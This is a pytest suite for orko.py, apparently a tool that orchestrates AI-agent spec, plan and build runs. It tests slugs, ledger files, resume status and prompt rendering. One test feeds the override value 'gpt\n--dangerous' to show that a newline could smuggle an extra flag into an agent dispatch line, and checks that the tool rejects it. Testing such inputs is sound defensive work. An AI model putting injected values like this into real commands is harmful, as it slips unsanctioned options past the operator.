"""Tests for orko.py — the deterministic spine of the orko skill."""
import hashlib
import json
import re
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

import orko
from conftest import FIXTURE_WORKSPACE


def init_run(workspace, capsys, mode="build", topic="Demo Topic", *extra):
    code = orko.main(["init", mode, topic, "--workspace", str(workspace),
                      "--owner", "oiler", "--boundaries", "code/ only",
                      "--trailer", "Co-Authored-By: T <t@example.invalid>",
                      "--trailer", "Claude-Session: https://example.invalid/s", *extra])
    captured = capsys.readouterr()
    out = captured.out
    return code, (json.loads(out) if out.strip().startswith("{") else captured.err)


class TestSlugify:
    def test_lowercases_and_hyphenates(self):
        assert orko.slugify("Orko Pipeline") == "orko-pipeline"

    def test_strips_punctuation(self):
        assert orko.slugify("spec -> plan, unattended!") == "spec-plan-unattended"

    def test_transliterates_non_ascii(self):
        assert orko.slugify("café résumé") == "cafe-resume"

    def test_drops_unmappable_characters(self):
        assert orko.slugify("日本語 pipeline") == "pipeline"

    def test_truncates_to_sixty_chars_without_trailing_hyphen(self):
        slug = orko.slugify("word " * 40)
        assert len(slug) <= 60
        assert not slug.endswith("-")

    def test_truncates_on_a_word_boundary(self):
        slug = orko.slugify(
            "Add a subtract function with a test and a CLI entry point that "
            "reads two numbers from argv")
        assert slug == "add-a-subtract-function-with-a-test-and-a-cli-entry-point"
        assert len(slug) <= 60

    def test_hard_cuts_when_the_first_word_is_longer_than_the_limit(self):
        slug = orko.slugify("a" * 80)
        assert slug == "a" * 60

    def test_empty_slug_is_an_error(self):
        with pytest.raises(ValueError):
            orko.slugify("日本語")


class TestComputePaths:
    def test_builds_every_path_from_the_workspace_and_slug(self, tmp_path):
        paths = orko.compute_paths(tmp_path, "demo", "2026-09-04")
        run_dir = tmp_path / ".orko/demo"
        assert paths["workspace"] == str(tmp_path)
        assert paths["docs"] == str(tmp_path / "docs")
        assert paths["code"] == str(tmp_path / "code")
        assert paths["run_dir"] == str(run_dir)
        assert paths["ledger"] == str(run_dir / "progress.md")
        assert paths["escalations"] == str(run_dir / "escalations.md")
        assert paths["tasks"] == str(run_dir / "tasks.md")
        assert paths["brief"] == str(run_dir / "brief.md")
        assert paths["synthesis"] == str(run_dir / "synthesis.md")
        assert paths["findings_dir"] == str(run_dir / "findings")
        assert paths["context_dir"] == str(run_dir / "context")

    def test_the_run_dir_hangs_off_the_workspace_root(self, tmp_path):
        paths = orko.compute_paths(tmp_path, "demo", "2026-09-04")
        assert Path(paths["run_dir"]) == tmp_path / ".orko" / "demo"

    def test_no_scratch_path_points_outside_the_run_dir(self, tmp_path):
        paths = orko.compute_paths(tmp_path, "demo", "2026-09-04")
        for key, value in paths.items():
            if key in {"slug", "date", "workspace", "docs", "code"}:
                continue
            assert value.startswith(str(tmp_path / ".orko/demo")), key

    def test_no_run_artifact_lives_in_either_repository(self, tmp_path):
        paths = orko.compute_paths(tmp_path, "demo", "2026-09-04")
        for key, value in paths.items():
            if key in {"slug", "date", "workspace", "docs", "code"}:
                continue
            assert not value.startswith(str(tmp_path / "docs")), key
            assert not value.startswith(str(tmp_path / "code")), key


class TestInit:
    def test_writes_json_header_with_every_field(self, workspace, capsys):
        code, payload = init_run(workspace, capsys)
        assert code == 0
        ledger = Path(payload["ledger"]).read_text(encoding="utf-8").splitlines()
        assert ledger[0] == "# orko run"
        header = json.loads(ledger[1].removeprefix("header: "))
        assert header["mode"] == "build" and header["owner"] == "oiler"
        assert header["version"] == "0.1" and header["executor"] == "claude"
        assert header["codex_model"] is None and header["boundaries"] == "code/ only"
        assert len(header["trailers"]) == 2
        assert payload["docs"] == str(workspace / "docs")

    def test_run_dir_is_under_workspace_root(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        assert Path(payload["run_dir"]) == workspace / ".orko" / "demo-topic"
        assert not (workspace / ".gitignore").exists()

    def test_records_codex_executor_and_overrides(self, workspace, capsys):
        _, payload = init_run(workspace, capsys, "build", "Demo Topic",
                              "--executor", "codex", "--codex-model", "gpt-5.6-sol",
                              "--codex-effort", "high")
        assert payload["executor"] == "codex" and payload["codex_model"] == "gpt-5.6-sol"

    def test_refuses_invalid_workspace_by_name(self, workspace, capsys):
        (workspace / "code" / "scripts" / "spec-check.sh").unlink()
        code, err = init_run(workspace, capsys)
        assert code == 2
        assert "spec-check-missing" in err

    def test_refuses_inactive_dossier(self, workspace, capsys):
        readme = workspace / "docs" / "versions" / "0.1" / "README.md"
        readme.write_text(readme.read_text().replace("status: active", "status: closed"))
        code, _ = init_run(workspace, capsys)
        assert code == 2

    def test_version_override(self, workspace, capsys):
        shutil.copytree(workspace / "docs/versions/0.1", workspace / "docs/versions/0.2")
        _, payload = init_run(workspace, capsys, "build", "Demo Topic", "--version", "0.2")
        assert payload["version"] == "0.2"

    def test_resume_keeps_header_and_reports_resumed(self, workspace, capsys):
        init_run(workspace, capsys)
        _, payload = init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        assert payload["resumed"] is True and payload["executor"] == "claude"

    def test_resume_says_so_when_a_passed_trailer_differs(self, workspace, capsys):
        init_run(workspace, capsys)
        capsys.readouterr()
        code = orko.main(["init", "build", "Demo Topic", "--workspace", str(workspace),
                          "--owner", "oiler", "--boundaries", "code/ only",
                          "--trailer", "Claude-Session: https://example.invalid/other"])
        captured = capsys.readouterr()
        assert code == 0
        assert "trailers differ from the ledger's; the recorded pair stands" in captured.err
        assert json.loads(captured.out)["trailers"] == [
            "Co-Authored-By: T <t@example.invalid>",
            "Claude-Session: https://example.invalid/s"]

    def test_resume_is_silent_when_no_trailer_differs(self, workspace, capsys):
        init_run(workspace, capsys)
        base = ["init", "build", "Demo Topic", "--workspace", str(workspace),
                "--owner", "oiler", "--boundaries", "code/ only"]
        capsys.readouterr()
        # A resume passing the recorded pair, and one passing no trailer at all:
        # the notice is for a differing value, not for every resume.
        orko.main(base + ["--trailer", "Co-Authored-By: T <t@example.invalid>",
                          "--trailer", "Claude-Session: https://example.invalid/s"])
        assert "trailers differ" not in capsys.readouterr().err
        orko.main(base)
        assert "trailers differ" not in capsys.readouterr().err

    def test_mode_collision_is_refused(self, workspace, capsys):
        init_run(workspace, capsys)
        code, _ = init_run(workspace, capsys, "analysis")
        assert code == 2

    def test_topic_collision_on_same_slug_is_refused(self, workspace, capsys):
        init_run(workspace, capsys, "build", "Demo Topic")
        code, _ = init_run(workspace, capsys, "build", "demo topic!")
        assert code == 2

    def test_creates_the_scratch_subdirectories(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        for key in ("findings_dir", "context_dir"):
            assert Path(payload[key]).is_dir(), key

    def test_reports_the_first_step_of_the_mode(self, workspace, capsys):
        _, payload = init_run(workspace, capsys)
        assert payload["slug"] == "demo-topic"
        assert payload["mode"] == "build"
        assert payload["next_step"] == 0
        assert payload["resumed"] is False


class TestDossier:
    def test_reads_the_active_version_from_status(self, workspace):
        assert orko.read_active_version(workspace) == "0.1"

    def test_dossier_dir_is_under_docs_versions(self, workspace):
        assert orko.dossier_dir(workspace, "0.1") == workspace / "docs/versions/0.1"

    def test_reads_the_dossier_status(self, workspace):
        assert orko.dossier_status(workspace, "0.1") == "active"

    def test_missing_file_reads_as_none(self, workspace):
        assert orko.dossier_status(workspace, "9.9") is None

    def test_missing_frontmatter_reads_as_none(self, workspace, tmp_path):
        target = tmp_path / "plain.md"
        target.write_text("# No frontmatter\n\nactive_version: 0.2\n")
        assert orko.read_frontmatter_field(target, "active_version") is None

    def test_no_active_version_is_a_usage_error(self, workspace, capsys):
        status = workspace / "docs" / "STATUS.md"
        status.write_text(status.read_text().replace('active_version: "0.1"', "owner: x"))
        code, err = init_run(workspace, capsys)
        assert code == 2
        assert "active_version" in err


class TestModes:
    def test_analysis_run_starts_at_step_one(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        run = json.loads(capsys.readouterr().out)
        assert run["mode"] == "analysis"
        assert run["next_step"] == 1
        assert run["next_step_name"] == "open"

    def test_build_run_starts_at_intake(self, workspace, capsys):
        init_run(workspace, capsys)
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        run = json.loads(capsys.readouterr().out)
        assert run["next_step"] == 0
        assert run["next_step_name"] == "intake"

    def test_ledger_rejects_a_step_outside_the_runs_mode(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        rc = orko.main(["ledger", "7", "complete", "--slug", "demo-topic",
                        "--workspace", str(workspace)])
        assert rc == 2
        assert "analysis" in capsys.readouterr().err

    def test_ledger_rejects_step_zero_on_analysis(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        rc = orko.main(["ledger", "0", "complete", "--slug", "demo-topic",
                        "--workspace", str(workspace)])
        assert rc == 2

    def test_reinit_with_a_different_mode_is_an_error(self, workspace, capsys):
        init_run(workspace, capsys)
        code, err = init_run(workspace, capsys, "analysis")
        assert code == 2
        assert "mode" in err

    def test_run_is_done_after_the_last_step_of_its_mode(self, workspace, capsys):
        init_run(workspace, capsys, "analysis")
        for step in range(1, 7):
            orko.main(["ledger", str(step), "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        assert json.loads(capsys.readouterr().out)["next_step"] is None


class TestErrorContracts:
    def test_an_invalid_workspace_names_every_finding(self, workspace, capsys):
        shutil.rmtree(workspace / "docs" / ".git")
        (workspace / "code" / "scripts" / "spec-check.sh").unlink()
        code, err = init_run(workspace, capsys)
        assert code == 2
        assert "workspace-invalid: docs-not-a-repo" in err
        assert "workspace-invalid: spec-check-missing" in err

    def test_no_workspace_above_the_cwd_is_a_usage_error(self, tmp_path, capsys,
                                                         monkeypatch):
        monkeypatch.chdir(tmp_path)
        assert orko.main(["status", "demo-topic"]) == 2
        assert "no workspace found above" in capsys.readouterr().err

    def test_init_with_an_unreadable_ledger_header_returns_usage_error(
        self, workspace, capsys
    ):
        run_dir = workspace / ".orko" / "demo-topic"
        run_dir.mkdir(parents=True)
        (run_dir / "progress.md").write_text("not a valid header\n")
        code, err = init_run(workspace, capsys)
        assert code == 2
        assert "unreadable ledger header" in err

    def test_an_empty_ledger_reports_an_error_rather_than_crashing(
        self, workspace, capsys
    ):
        run_dir = workspace / ".orko" / "demo-topic"
        run_dir.mkdir(parents=True)
        (run_dir / "progress.md").write_text("")
        code, err = init_run(workspace, capsys)
        assert code == 2
        assert "unreadable ledger header" in err
        assert orko.main(["status", "demo-topic", "--workspace", str(workspace)]) == 2

    def test_a_header_whose_json_is_truncated_is_unreadable(self, workspace, capsys):
        run_dir = workspace / ".orko" / "demo-topic"
        run_dir.mkdir(parents=True)
        (run_dir / "progress.md").write_text('# orko run\nheader: {"mode": "bui\n')
        code, err = init_run(workspace, capsys)
        assert code == 2
        assert "unreadable ledger header" in err

    def test_a_header_missing_a_key_is_unreadable(self, workspace, capsys):
        run_dir = workspace / ".orko" / "demo-topic"
        run_dir.mkdir(parents=True)
        (run_dir / "progress.md").write_text(
            '# orko run\nheader: {"mode": "build", "topic": "Demo Topic"}\n')
        code, err = init_run(workspace, capsys)
        assert code == 2
        assert "unreadable ledger header" in err

    def test_a_header_with_an_unknown_mode_is_unreadable(self, workspace, capsys):
        # Every caller indexes MODES with the mode, so a header naming one that
        # does not exist must read as unreadable, not raise KeyError.
        _, payload = init_run(workspace, capsys)
        ledger = Path(payload["ledger"])
        title, header, *rest = ledger.read_text(encoding="utf-8").splitlines()
        fields = json.loads(header.removeprefix("header: "))
        fields["mode"] = "bogus"
        ledger.write_text("\n".join([title, "header: " + json.dumps(fields), *rest]) + "\n",
                          encoding="utf-8")
        capsys.readouterr()
        assert orko.main(["status", "demo-topic", "--workspace", str(workspace)]) == 2
        assert "unreadable ledger header" in capsys.readouterr().err

    @pytest.mark.parametrize("topic", [
        "Demo\nTopic",
        "Demo\tTopic",
        "Demo\x00Topic",
    ])
    def test_a_topic_with_a_control_character_is_rejected(self, workspace, capsys,
                                                          topic):
        code, err = init_run(workspace, capsys, "build", topic)
        assert code == 2
        assert "control character" in err
        assert not (workspace / ".orko").exists()

    @pytest.mark.parametrize("flag", ["--codex-model", "--codex-effort"])
    def test_a_codex_override_with_a_control_character_is_rejected(
        self, workspace, capsys, flag
    ):
        # Both ride on the dispatch line the conductor pastes, where a newline
        # would split the flags from the sentence.
        code, err = init_run(workspace, capsys, "build", "Demo Topic",
                             "--executor", "codex", flag, "gpt\n--dangerous")
        assert code == 2
        assert "control character" in err
        assert not (workspace / ".orko").exists()

    def test_a_topic_that_slugifies_to_nothing_is_an_error_not_a_traceback(
        self, workspace, capsys
    ):
        code, err = init_run(workspace, capsys, "build", "日本語")
        assert code == 2
        assert "empty slug" in err

    def test_ledger_for_an_unknown_slug_names_the_run(self, workspace, capsys):
        rc = orko.main(["ledger", "1", "complete", "--slug", "nope",
                        "--workspace", str(workspace)])
        assert rc == 2
        assert "no run named" in capsys.readouterr().err


class TestLedgerAndStatus:
    def _init(self, workspace, capsys, topic="Demo Topic"):
        init_run(workspace, capsys, "build", topic)

    def _complete_through_spec(self, workspace, commit=None):
        """Walk a build run past intake and the spec step, to the spec review."""
        for step in (0, 1):
            argv = ["ledger", str(step), "complete", "--slug", "demo-topic",
                    "--workspace", str(workspace)]
            if commit and step == 1:
                argv += ["--commit", commit]
            orko.main(argv)

    def test_ledger_appends_a_line_with_commit(self, workspace, capsys):
        self._init(workspace, capsys)
        rc = orko.main(["ledger", "1", "complete", "--slug", "demo-topic",
                        "--workspace", str(workspace), "--commit", "abc1234"])
        assert rc == 0
        text = (workspace / ".orko/demo-topic/progress.md").read_text()
        assert text.splitlines()[-1] == "step 1 complete commit=abc1234"

    def test_ledger_rejects_a_non_sha_commit(self, workspace, capsys):
        self._init(workspace, capsys)
        rc = orko.main(["ledger", "1", "complete", "--slug", "demo-topic",
                        "--workspace", str(workspace), "--commit", "not a sha"])
        assert rc == 2
        assert "--commit must be a short or full SHA" in capsys.readouterr().err

    def test_ledger_accepts_a_sha_range_as_a_dispatched_base(self, workspace, capsys):
        self._init(workspace, capsys)
        self._complete_through_spec(workspace)
        rc = orko.main(["ledger", "2", "dispatched", "--slug", "demo-topic",
                        "--workspace", str(workspace), "--commit", "ba5e123..dec0de1"])
        assert rc == 0
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        assert json.loads(capsys.readouterr().out)["dispatched_base"] == (
            "ba5e123..dec0de1"
        )

    def test_ledger_is_append_only(self, workspace, capsys):
        self._init(workspace, capsys)
        for step in (1, 2):
            orko.main(["ledger", str(step), "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        lines = (workspace / ".orko/demo-topic/progress.md").read_text().splitlines()
        # intake's own STATUS line stays put ahead of them
        assert lines[2] == "touched docs/STATUS.md"
        assert lines[-2:] == ["step 1 complete", "step 2 complete"]

    def test_ledger_records_a_dispatched_base_sha(self, workspace, capsys):
        self._init(workspace, capsys)
        rc = orko.main(["ledger", "2", "dispatched", "--slug", "demo-topic",
                        "--workspace", str(workspace), "--commit", "ba5e123"])
        assert rc == 0
        text = (workspace / ".orko/demo-topic/progress.md").read_text()
        assert text.splitlines()[-1] == "step 2 dispatched commit=ba5e123"

    @pytest.mark.parametrize("status", ["dispatched", "escalated", "failed"])
    def test_only_complete_advances_the_resume_point(self, workspace, capsys, status):
        self._init(workspace, capsys)
        self._complete_through_spec(workspace)
        orko.main(["ledger", "2", status, "--slug", "demo-topic",
                   "--workspace", str(workspace), "--commit", "ba5e123"])
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        assert json.loads(capsys.readouterr().out)["next_step"] == 2

    def test_status_with_slug_reports_the_resume_point(self, workspace, capsys):
        self._init(workspace, capsys)
        self._complete_through_spec(workspace)
        capsys.readouterr()
        rc = orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        assert rc == 0
        payload = json.loads(capsys.readouterr().out)
        assert payload["next_step"] == 2
        assert payload["next_step_name"] == "spec review"
        assert payload["topic"] == "Demo Topic"

    def test_status_carries_the_header_fields(self, workspace, capsys):
        self._init(workspace, capsys)
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        payload = json.loads(capsys.readouterr().out)
        assert payload["owner"] == "oiler"
        assert payload["version"] == "0.1"
        assert payload["executor"] == "claude"
        assert payload["boundaries"] == "code/ only"
        assert len(payload["trailers"]) == 2

    def test_status_reports_none_when_the_run_is_complete(self, workspace, capsys):
        self._init(workspace, capsys)
        for step in range(0, 8):
            orko.main(["ledger", str(step), "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        assert json.loads(capsys.readouterr().out)["next_step"] is None

    def test_bare_status_lists_every_run(self, workspace, capsys):
        self._init(workspace, capsys, topic="Alpha Feature")
        self._init(workspace, capsys, topic="Beta Feature")
        orko.main(["ledger", "0", "complete", "--slug", "alpha-feature",
                   "--workspace", str(workspace)])
        capsys.readouterr()
        rc = orko.main(["status", "--workspace", str(workspace)])
        assert rc == 0
        runs = json.loads(capsys.readouterr().out)
        assert [r["slug"] for r in runs] == ["alpha-feature", "beta-feature"]
        assert [r["next_step"] for r in runs] == [1, 0]

    def test_bare_status_with_no_runs_prints_an_empty_list(self, workspace, capsys):
        rc = orko.main(["status", "--workspace", str(workspace)])
        assert rc == 0
        assert json.loads(capsys.readouterr().out) == []

    def test_status_exposes_the_last_status_and_the_dispatched_base(
        self, workspace, capsys
    ):
        self._init(workspace, capsys)
        self._complete_through_spec(workspace, commit="aaa1111")
        orko.main(["ledger", "2", "dispatched", "--slug", "demo-topic",
                   "--workspace", str(workspace), "--commit", "bbb2222"])
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        payload = json.loads(capsys.readouterr().out)
        assert payload["next_step"] == 2
        assert payload["last_status"] == "dispatched"
        assert payload["dispatched_base"] == "bbb2222"

    def test_a_fresh_run_reports_no_last_status_and_no_dispatched_base(
        self, workspace, capsys
    ):
        self._init(workspace, capsys)
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        payload = json.loads(capsys.readouterr().out)
        assert payload["last_status"] is None
        assert payload["dispatched_base"] is None

    def test_the_dispatched_base_is_scoped_to_the_step_being_resumed(
        self, workspace, capsys
    ):
        self._init(workspace, capsys)
        for step, status, commit in (
            (0, "complete", "000aaa0"),
            (1, "complete", "aaa1111"),
            (2, "dispatched", "bbb2222"),
            (2, "complete", "ccc3333"),
            (3, "complete", "ddd4444"),
        ):
            orko.main(["ledger", str(step), status, "--slug", "demo-topic",
                       "--workspace", str(workspace), "--commit", commit])
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        payload = json.loads(capsys.readouterr().out)
        assert payload["next_step"] == 4
        assert payload["last_status"] == "complete"
        # Step 2's base must not leak into a step-4 resume.
        assert payload["dispatched_base"] is None

    def test_the_latest_dispatch_wins_when_a_step_was_dispatched_twice(
        self, workspace, capsys
    ):
        self._init(workspace, capsys)
        for commit in ("bbb2222", "eee5555"):
            orko.main(["ledger", "2", "dispatched", "--slug", "demo-topic",
                       "--workspace", str(workspace), "--commit", commit])
        self._complete_through_spec(workspace)
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        assert json.loads(capsys.readouterr().out)["dispatched_base"] == "eee5555"

    def test_an_escalated_line_is_the_last_status_after_a_completed_step(
        self, workspace, capsys
    ):
        self._init(workspace, capsys)
        self._complete_through_spec(workspace, commit="aaa1111")
        orko.main(["ledger", "1", "escalated", "--slug", "demo-topic",
                   "--workspace", str(workspace)])
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        payload = json.loads(capsys.readouterr().out)
        assert payload["next_step"] == 2
        assert payload["last_status"] == "escalated"

    def test_a_malformed_ledger_line_is_skipped_not_fatal(self, workspace, capsys):
        self._init(workspace, capsys)
        ledger = workspace / ".orko/demo-topic/progress.md"
        with ledger.open("a", encoding="utf-8") as handle:
            handle.write("this is not a step record\n")
        self._complete_through_spec(workspace)
        capsys.readouterr()
        assert orko.main(["status", "demo-topic", "--workspace", str(workspace)]) == 0
        payload = json.loads(capsys.readouterr().out)
        assert payload["next_step"] == 2
        assert payload["last_status"] == "complete"

    def test_status_for_an_unknown_slug_is_an_error(self, workspace, capsys):
        rc = orko.main(["status", "nope", "--workspace", str(workspace)])
        assert rc == 2
        assert "no run" in capsys.readouterr().err


class TestLedgerSubSteps:
    def test_substep_accepted_on_codex_build(self, workspace, capsys):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        assert orko.main(["ledger", "5.1", "complete", "--slug", "demo-topic",
                          "--workspace", str(workspace)]) == 0

    def test_substep_rejected_on_claude_build(self, workspace, capsys):
        init_run(workspace, capsys)
        assert orko.main(["ledger", "5.1", "complete", "--slug", "demo-topic",
                          "--workspace", str(workspace)]) == 2

    def test_next_step_ignores_substeps(self, workspace, capsys):
        _, payload = init_run(workspace, capsys, "build", "Demo Topic",
                              "--executor", "codex")
        ledger = Path(payload["ledger"])
        for step in ("0", "1", "2", "3", "4"):
            orko.main(["ledger", step, "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        orko.main(["ledger", "5.1", "complete", "--slug", "demo-topic",
                   "--workspace", str(workspace)])
        orko.main(["ledger", "5.2", "complete", "--slug", "demo-topic",
                   "--workspace", str(workspace)])
        assert orko._next_step(ledger, "build") == 5
        assert orko.next_task(ledger) == 3

    def test_status_reports_next_task_and_records(self, workspace, capsys):
        _, payload = init_run(workspace, capsys, "build", "Demo Topic",
                              "--executor", "codex")
        ledger = Path(payload["ledger"])
        orko.append_ledger(
            ledger,
            "record spec spec SPEC-001 docs/versions/0.1/specs/SPEC-001-demo-topic.md",
        )
        orko.append_ledger(
            ledger,
            "hash docs/versions/0.1/specs/SPEC-001-demo-topic.md " + "a" * 64,
        )
        capsys.readouterr()
        assert orko.main(["status", "demo-topic", "--workspace", str(workspace)]) == 0
        out = json.loads(capsys.readouterr().out)
        assert out["next_task"] == 1
        assert out["records"] == [{"type": "spec", "role": "spec", "id": "SPEC-001",
                                   "path": "docs/versions/0.1/specs/SPEC-001-demo-topic.md",
                                   "sha": "a" * 64}]

    def test_status_reports_the_dispatched_base_of_the_open_sub_step(
        self, workspace, capsys
    ):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        for step in ("0", "1", "2", "3", "4"):
            orko.main(["ledger", step, "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        orko.main(["ledger", "5.1", "dispatched", "--commit", "f" * 40,
                   "--slug", "demo-topic", "--workspace", str(workspace)])
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        payload = json.loads(capsys.readouterr().out)
        assert payload["next_step"] == 5 and payload["next_task"] == 1
        assert payload["dispatched_base"] == "f" * 40

    def test_a_codex_run_falls_back_to_the_whole_step_base(self, workspace, capsys):
        init_run(workspace, capsys, "build", "Demo Topic", "--executor", "codex")
        for step in ("0", "1", "2", "3", "4"):
            orko.main(["ledger", step, "complete", "--slug", "demo-topic",
                       "--workspace", str(workspace)])
        orko.main(["ledger", "5", "dispatched", "--commit", "d" * 40,
                   "--slug", "demo-topic", "--workspace", str(workspace)])
        capsys.readouterr()
        orko.main(["status", "demo-topic", "--workspace", str(workspace)])
        assert json.loads(capsys.readouterr().out)["dispatched_base"] == "d" * 40

    def test_touched_paths_are_deduplicated_in_order(self, workspace, capsys):
        _, payload = init_run(workspace, capsys, "build", "Demo Topic",
                              "--executor", "codex")
        ledger = Path(payload["ledger"])
        orko.append_ledger(ledger, "touched docs/STATUS.md")
        orko.append_ledger(ledger, "touched docs/STATUS.md")
        assert orko.touched(ledger) == ["docs/STATUS.md"]


class TestStripCode:
    def test_blanks_inline_code_but_keeps_line_count(self):
        out = orko.strip_code("alpha `TODO` omega\nsecond line\n")
        assert "TODO" not in out
        assert out.splitlines()[0].startswith("alpha ")
        assert len(out.splitlines()) == 2

    def test_blanks_fenced_blocks(self):
        text = "before\n```\nTODO inside a fence\n```\nafter\n"
        out = orko.strip_code(text)
        assert "TODO" not in out
        assert out.splitlines()[0] == "before"
        assert out.splitlines()[4] == "after"

    def test_blanks_tilde_fences(self):
        out = orko.strip_code("~~~\nTBD\n~~~\n")
        assert "TBD" not in out

    def test_leaves_ordinary_prose_untouched(self):
        assert orko.strip_code("plain words\n") == "plain words\n"


class TestCheckTasksCLI:
    def test_passing_tasks_exits_zero(self, tmp_path, capsys):
        target = tmp_path / "tasks.md"
        target.write_text(PLAN_OK)
        assert orko.main(["check", "tasks", str(target)]) == 0
        assert "OK" in capsys.readouterr().out

    def test_failing_tasks_exits_one_and_lists_findings(self, tmp_path, capsys):
        target = tmp_path / "tasks.md"
        target.write_text(PLAN_OK + "\nTBD\n")
        assert orko.main(["check", "tasks", str(target)]) == 1
        assert "tasks.md:" in capsys.readouterr().out

    def test_workspace_flag_is_accepted(self, tmp_path, capsys):
        # Every orko.py call in build.md carries `--workspace <path>` uniformly.
        target = tmp_path / "tasks.md"
        target.write_text(PLAN_OK)
        assert orko.main(["check", "tasks", str(target),
                          "--workspace", str(tmp_path)]) == 0

    def test_missing_file_exits_two(self, tmp_path, capsys):
        assert orko.main(["check", "tasks", str(tmp_path / "nope.md")]) == 2
        assert "cannot read" in capsys.readouterr().err


PLAN_OK = """# Demo Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development to implement this plan task-by-task.

**Goal:** Build the demo.

## Global Constraints

- Python 3.12+.

---

### Task 1: First component

**Files:**
- Create: `src/demo.py`

**Acceptance:** `uv run pytest -q`

- [ ] **Step 1: Write the failing test**

- [ ] **Step 2: Commit**
"""


class TestValidatePlan:
    def test_a_complete_plan_passes(self):
        assert orko.validate_plan(PLAN_OK) == []

    def test_missing_required_sub_skill_header_is_reported(self):
        text = PLAN_OK.replace("REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development", "Go build it")
        messages = " ".join(f.message for f in orko.validate_plan(text))
        assert "REQUIRED SUB-SKILL" in messages

    def test_missing_global_constraints_is_reported(self):
        text = PLAN_OK.replace("## Global Constraints", "## Notes")
        messages = " ".join(f.message for f in orko.validate_plan(text))
        assert "Global Constraints" in messages

    def test_no_task_blocks_is_reported(self):
        text = PLAN_OK.replace("### Task 1: First component", "### Notes")
        messages = " ".join(f.message for f in orko.validate_plan(text))
        assert "task block" in messages.lower()

    def test_task_without_files_subsection_is_reported(self):
        text = PLAN_OK.replace("**Files:**\n- Create: `src/demo.py`\n", "")
        messages = " ".join(f.message for f in orko.validate_plan(text))
        assert "Files:" in messages

    def test_task_without_step_checkbox_is_reported(self):
        text = PLAN_OK.replace("- [ ] **Step 1: Write the failing test**\n", "")
        text = text.replace("- [ ] **Step 2: Commit**\n", "")
        messages = " ".join(f.message for f in orko.validate_plan(text))
        assert "checkbox" in messages.lower()

    @pytest.mark.parametrize("red_flag", [
        "Similar to Task 1",
        "Add appropriate error handling",
        "add validation",
        "handle edge cases",
        "Write tests for the above",
    ])
    def test_red_flags_are_reported(self, red_flag):
        messages = " ".join(
            f.message for f in orko.validate_plan(PLAN_OK + f"\n{red_flag}\n")
        )
        assert red_flag.lower().split()[0] in messages.lower()

    def test_red_flags_inside_code_spans_are_ignored(self):
        assert orko.validate_plan(
            PLAN_OK + "\nNever write `Similar to Task N` in a plan.\n"
        ) == []

    def test_placeholder_markers_are_reported(self):
        findings = orko.validate_plan(PLAN_OK + "\nTBD\n")
        assert any("TBD" in f.message for f in findings)


class TestPrompt:
    def test_spec_review_substitutes_every_token_including_the_lens(self, workspace, capsys):
        init_run(workspace, capsys)
        assert orko.main(["prompt", "spec-review", "demo-topic", "--lens", "security",
                          "--workspace", str(workspace)]) == 0
        out = capsys.readouterr().out
        assert "{{" not in out
        assert "(no spec minted yet)" in out
        assert str(workspace / "docs") in out
        assert str(workspace / "code") in out
        assert str(workspace / ".orko/demo-topic/findings/0/security.md") in out
        assert "Your lens is **security**" in out
        assert "trust boundary" in out
        assert "## Lenses" not in out

    def test_plan_review_names_both_records(self, workspace, capsys):
        init_run(workspace, capsys)
        orko.main(["prompt", "plan-review", "demo-topic", "--lens", "coverage",
                   "--workspace", str(workspace)])
        out = capsys.readouterr().out
        assert "(no plan minted yet)" in out
        assert "(no spec minted yet)" in out
        assert "{{" not in out

    def test_unknown_lens_is_a_usage_error_naming_the_valid_ones(self, workspace, capsys):
        init_run(workspace, capsys)
        rc = orko.main(["prompt", "spec-review", "demo-topic", "--lens", "vibes",
                        "--workspace", str(workspace)])
        assert rc == 2
        err = capsys.readouterr().err
        for lens in ("requirements", "architecture", "testability", "security"):
            assert lens in err

    def test_review_kinds_require_a_lens(self, workspace, capsys):
        init_run(workspace, capsys)
        rc = orko.main(["prompt", "plan-review", "demo-topic",
                        "--workspace", str(workspace)])
        assert rc == 2

    def test_plan_write_names_the_tasks_file_and_both_repositories(self, workspace, capsys):
        init_run(workspace, capsys)
        assert orko.main(["prompt", "plan-write", "demo-topic",
                          "--workspace", str(workspace)]) == 0
        out = capsys.readouterr().out
        assert str(workspace / ".orko/demo-topic/tasks.md") in out
        assert str(workspace / "docs") in out
        assert str(workspace / "code") in out
        assert "{{" not in out

    def test_every_build_charter_carries_the_run_boundaries(self, workspace, capsys):
        # A plan-writer with no boundaries drafts increments outside them, and a
        # reviewer with no boundaries cannot flag that as `scope:`.
        init_run(workspace, capsys)
        for argv in (["prompt", "plan-write", "demo-topic"],
                     ["prompt", "spec-review", "demo-topic", "--lens", "security"],
                     ["prompt", "plan-review", "demo-topic", "--lens", "coverage"]):
            capsys.readouterr()
